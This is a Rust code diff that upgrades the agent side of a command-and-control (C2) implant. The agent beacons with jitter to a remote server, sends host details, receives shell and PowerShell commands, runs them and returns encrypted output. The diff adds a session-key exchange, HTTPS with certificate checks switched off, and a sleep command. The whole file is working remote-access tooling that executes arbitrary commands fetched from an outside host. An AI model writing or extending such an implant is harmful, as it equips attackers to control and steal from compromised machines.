@@ -17,6 +17,7 @@ mod crypto;
 struct BeaconPayload {
     id: String,
     status: String,
+    bootstrap: bool,
     hostname: String,
     os: String,
     cpu_usage: f64,
@@ -39,6 +40,7 @@ struct BeaconResponse {
     success: bool,
     timestamp: String,
     commands: Vec<PendingCommand>,
+    session_key: Option<String>,
 }
 
 #[derive(Deserialize, Clone)]
@@ -60,16 +62,19 @@ async fn main() {
     println!("Host: {}, OS: {}", hostname, os);
 
     let server_url = std::env::var("C2_SERVER_URL")
-        .unwrap_or_else(|_| "http://localhost:3000".to_string());
+        .unwrap_or_else(|_| "https://localhost:3443".to_string());
 
     let auth_token = auth::compute_agent_token(&agent_id);
     let psk = auth::get_psk();
+    let psk_key = crypto::derive_key_from_psk(&psk);
+    let mut session_key_hex = load_session_key();
 
     println!("Beacon server: {}", server_url);
     println!("Starting beacon loop with 20-60s jitter (AES-GCM encrypted)...");
 
     let client = Client::builder()
         .timeout(Duration::from_secs(30))
+        .danger_accept_invalid_certs(true)
         .build()
         .expect("Failed to create HTTP client");
 
@@ -77,11 +82,13 @@ async fn main() {
 
     loop {
         let jitter = rand::thread_rng().gen_range(20..=60);
+        let bootstrap = session_key_hex.is_none();
 
         let metrics = system_info::get_system_metrics(&mut sys);
         let payload = BeaconPayload {
             id: agent_id.clone(),
             status: "alive".to_string(),
+            bootstrap,
             hostname: hostname.clone(),
             os: os.clone(),
             cpu_usage: metrics.cpu_usage,
@@ -89,8 +96,15 @@ async fn main() {
             disk_usage: metrics.disk_usage,
         };
 
+        let encrypt_key = if bootstrap {
+            psk_key
+        } else {
+            crypto::key_from_hex(session_key_hex.as_ref().unwrap())
+                .unwrap_or(psk_key)
+        };
+
         let payload_bytes = serde_json::to_vec(&payload).expect("serialize beacon");
-        let encrypted = match crypto::encrypt(&payload_bytes, &psk) {
+        let encrypted = match crypto::encrypt(&payload_bytes, &encrypt_key) {
             Ok(e) => e,
             Err(e) => {
                 eprintln!("Encryption failed: {}", e);
@@ -99,54 +113,71 @@ async fn main() {
             }
         };
 
-        let beacon_url = format!("{}/api/beacon", server_url);
+        let beacon_url = format!("{}/api/beacon", server_url.trim_end_matches('/'));
         match client
             .post(&beacon_url)
             .header("Authorization", format!("Bearer {}", auth_token))
+            .header("X-Agent-Id", &agent_id)
             .json(&EncryptedEnvelope { payload: encrypted })
             .send()
             .await
         {
             Ok(response) => {
                 if response.status().is_success() {
+                    let decrypt_key = if bootstrap {
+                        psk_key
+                    } else {
+                        crypto::key_from_hex(session_key_hex.as_ref().unwrap())
+                            .unwrap_or(psk_key)
+                    };
+
                     match response.json::<EncryptedResponse>().await {
-                        Ok(envelope) => {
-                            match crypto::decrypt(&envelope.payload, &psk) {
-                                Ok(plaintext) => {
-                                    match serde_json::from_slice::<BeaconResponse>(&plaintext) {
-                                        Ok(beacon_resp) => {
-                                            if beacon_resp.success {
+                        Ok(envelope) => match crypto::decrypt(&envelope.payload, &decrypt_key) {
+                            Ok(plaintext) => {
+                                match serde_json::from_slice::<BeaconResponse>(&plaintext) {
+                                    Ok(beacon_resp) => {
+                                        if beacon_resp.success {
+                                            if let Some(key) = beacon_resp.session_key {
+                                                save_session_key(&key);
+                                                session_key_hex = Some(key);
+                                                println!("Session key established via key exchange");
+                                            }
+
+                                            println!(
+                                                "Beacon accepted at {} (cpu {:.1}%, mem {:.1}%)",
+                                                beacon_resp.timestamp,
+                                                metrics.cpu_usage,
+                                                metrics.memory_usage
+                                            );
+
+                                            for cmd in beacon_resp.commands {
                                                 println!(
-                                                    "Beacon accepted at {} (cpu {:.1}%, mem {:.1}%)",
-                                                    beacon_resp.timestamp,
-                                                    metrics.cpu_usage,
-                                                    metrics.memory_usage
+                                                    "Received command {}: {}",
+                                                    cmd.id, cmd.command_type
                                                 );
-                                                for cmd in beacon_resp.commands {
-                                                    println!(
-                                                        "Received command {}: {}",
-                                                        cmd.id, cmd.command_type
-                                                    );
-                                                    execute_command(
-                                                        &client,
-                                                        &server_url,
-                                                        &agent_id,
-                                                        &auth_token,
-                                                        &psk,
-                                                        cmd,
-                                                    )
-                                                    .await;
-                                                }
+                                                execute_command(
+                                                    &client,
+                                                    &server_url,
+                                                    &agent_id,
+                                                    &auth_token,
+                                                    session_key_hex.as_ref(),
+                                                    cmd,
+                                                )
+                                                .await;
                                             }
                                         }
-                                        Err(e) => eprintln!("Failed to parse beacon response: {}", e),
                                     }
+                                    Err(e) => eprintln!("Failed to parse beacon response: {}", e),
                                 }
-                                Err(e) => eprintln!("Failed to decrypt response: {}", e),
                             }
-                        }
+                            Err(e) => eprintln!("Failed to decrypt response: {}", e),
+                        },
                         Err(e) => eprintln!("Failed to read response envelope: {}", e),
                     }
+                } else if response.status() == reqwest::StatusCode::UNAUTHORIZED {
+                    eprintln!("Session expired — re-bootstrapping key exchange");
+                    session_key_hex = None;
+                    let _ = fs::remove_file("session_key.txt");
                 } else {
                     eprintln!("Beacon rejected: HTTP {}", response.status());
                 }
@@ -164,7 +195,7 @@ async fn execute_command(
     server_url: &str,
     agent_id: &str,
     auth_token: &str,
-    psk: &str,
+    session_key_hex: Option<&String>,
     cmd: PendingCommand,
 ) {
     println!("Executing command {}: {}", cmd.id, cmd.payload);
@@ -172,6 +203,14 @@ async fn execute_command(
     let output = match cmd.command_type.as_str() {
         "shell" | "bash" | "cmd" => execute_shell(&cmd.payload),
         "powershell" => execute_powershell(&cmd.payload),
+        "sleep" => {
+            if let Ok(secs) = cmd.payload.trim().parse::<u64>() {
+                sleep(Duration::from_secs(secs)).await;
+                format!("Slept for {} seconds", secs)
+            } else {
+                "Invalid sleep payload — use seconds as integer".to_string()
+            }
+        }
         _ => format!("Unknown command type: {}", cmd.command_type),
     };
 
@@ -182,6 +221,11 @@ async fn execute_command(
     };
     println!("Command {} output (first 100 chars): {}", cmd.id, preview);
 
+    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
+    let encrypt_key = session_key_hex
+        .and_then(|hex| crypto::key_from_hex(hex).ok())
+        .unwrap_or(psk_key);
+
     let result_payload = json!({
         "agent_id": agent_id,
         "command_id": cmd.id,
@@ -190,7 +234,7 @@ async fn execute_command(
     });
 
     let payload_bytes = serde_json::to_vec(&result_payload).expect("serialize result");
-    let encrypted = match crypto::encrypt(&payload_bytes, psk) {
+    let encrypted = match crypto::encrypt(&payload_bytes, &encrypt_key) {
         Ok(e) => e,
         Err(e) => {
             eprintln!("Failed to encrypt result: {}", e);
@@ -198,10 +242,11 @@ async fn execute_command(
         }
     };
 
-    let result_url = format!("{}/api/result", server_url);
+    let result_url = format!("{}/api/result", server_url.trim_end_matches('/'));
     match client
         .post(&result_url)
         .header("Authorization", format!("Bearer {}", auth_token))
+        .header("X-Agent-Id", agent_id)
         .json(&EncryptedEnvelope { payload: encrypted })
         .send()
         .await
@@ -264,4 +309,15 @@ fn get_or_create_agent_id() -> String {
     let new_id = Uuid::new_v4().to_string();
     let _ = fs::write(id_file, &new_id);
     new_id
+}
+
+fn load_session_key() -> Option<String> {
+    fs::read_to_string("session_key.txt")
+        .ok()
+        .map(|s| s.trim().to_string())
+        .filter(|s| !s.is_empty())
+}
+
+fn save_session_key(key: &str) {
+    let _ = fs::write("session_key.txt", key);
 }
